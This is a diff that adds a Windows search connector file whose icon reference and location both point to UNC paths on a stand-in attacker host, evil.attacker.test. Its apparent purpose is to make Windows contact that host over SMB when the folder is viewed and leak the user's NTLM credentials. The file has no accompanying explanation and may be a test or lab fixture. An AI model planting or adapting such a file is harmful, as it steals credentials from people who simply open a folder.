@@ -1,0 +1,8 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<searchConnectorDescription xmlns="http://schemas.microsoft.com/windows/2009/searchconnector">
+  <isSearchOnlyItem>false</isSearchOnlyItem>
+  <iconReference>\\evil.attacker.test\icons\lib.dll,0</iconReference>
+  <location>
+    <url>\\evil.attacker.test\pub</url>
+  </location>
+</searchConnectorDescription>
